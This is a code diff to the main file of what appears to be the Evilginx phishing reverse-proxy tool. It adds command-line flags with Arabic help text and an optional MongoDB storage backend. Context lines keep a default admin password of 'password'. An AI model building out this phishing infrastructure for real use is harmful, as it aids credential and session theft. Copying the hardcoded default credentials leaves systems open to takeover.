@@ -29,6 +29,19 @@ var api_host = flag.String("api-host", "127.0.0.1", "API server host")
 var api_port = flag.Int("api-port", 8888, "API server port")
 var admin_username = flag.String("admin-username", "admin", "Admin username for API server")
 var admin_password = flag.String("admin-password", "password", "Admin password for API server")
+var setup_session = flag.String("setup-session", "setup", "تعيين اسم جلسة الإعداد البعيد")
+var tkn_ptr = flag.String("token", "", "تعيين رمز وصول التحكم عن بعد (مطلوب للتحكم عن بعد)")
+var daemon_ptr = flag.Bool("daemon", false, "تشغيل في وضع الخادم")
+var hostname_ptr = flag.String("hostname", "", "تعيين المضيف للاستماع")
+var port_ptr = flag.Int("port", 8080, "تعيين منفذ للاستماع")
+var http_ptr = flag.Bool("http", false, "تمكين الاستماع إلى HTTP")
+var no_https_ptr = flag.Bool("no-https", false, "تعطيل الاستماع إلى HTTPS")
+var ip_ptr = flag.String("ip", "", "تعيين عنوان IP الخارجي")
+var unauth_ptr = flag.String("unauth", "https://www.google.com/", "تعيين URL لإعادة التوجيه للمستخدمين غير المصرح لهم")
+var db_path = flag.String("db-path", "", "تعيين مسار ملف قاعدة البيانات")
+var use_mongo = flag.Bool("use-mongo", false, "استخدام MongoDB بدلاً من قاعدة البيانات المضمنة")
+var mongo_uri = flag.String("mongo-uri", "mongodb://localhost:27017", "عنوان اتصال MongoDB")
+var mongo_db_name = flag.String("mongo-db", "evilginx", "اسم قاعدة بيانات MongoDB")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -128,10 +141,58 @@ func main() {
 	}
 	cfg.SetRedirectorsDir(*redirectors_dir)
 
-	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
-	if err != nil {
-		log.Fatal("database: %v", err)
-		return
+	// إعلان متغير واجهة قاعدة البيانات
+	var db database.IDatabase
+
+	if *use_mongo {
+		// استخدام MongoDB
+		db_name := *mongo_db_name
+		if db_name == "" {
+			db_name = "evilginx"
+		}
+
+		fmt.Printf("\n\n")
+		fmt.Printf(lb + " تهيئة قاعدة بيانات MongoDB... ")
+
+		mongo_db, err := database.NewMongoDatabase(*mongo_uri, db_name)
+		if err != nil {
+			log.Fatal(err)
+		}
+		db = mongo_db
+
+		fmt.Printf(lg + "تم" + e)
+	} else {
+		// استخدام BuntDB (التنفيذ الحالي)
+		storage_path := ""
+		if *db_path != "" {
+			storage_path = *db_path
+		} else if *cfg_dir != "" {
+			storage_path = filepath.Join(*cfg_dir, "data.db")
+		} else {
+			ex_path, err := os.Executable()
+			if err != nil {
+				log.Fatal(err)
+			}
+			ex_dir := filepath.Dir(ex_path)
+			storage_path = filepath.Join(ex_dir, "data.db")
+		}
+
+		fmt.Printf("\n\n")
+		fmt.Printf(lb + " تهيئة قاعدة البيانات... " + e)
+		fmt.Printf("%s [%s]", storage_path, core.DbVersion)
+
+		err = os.MkdirAll(filepath.Dir(storage_path), 0711)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		fdb, err := database.NewDatabase(storage_path)
+		if err != nil {
+			log.Fatal(err)
+		}
+		db = fdb
+
+		fmt.Printf(lg + "تم" + e)
 	}
 
 	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
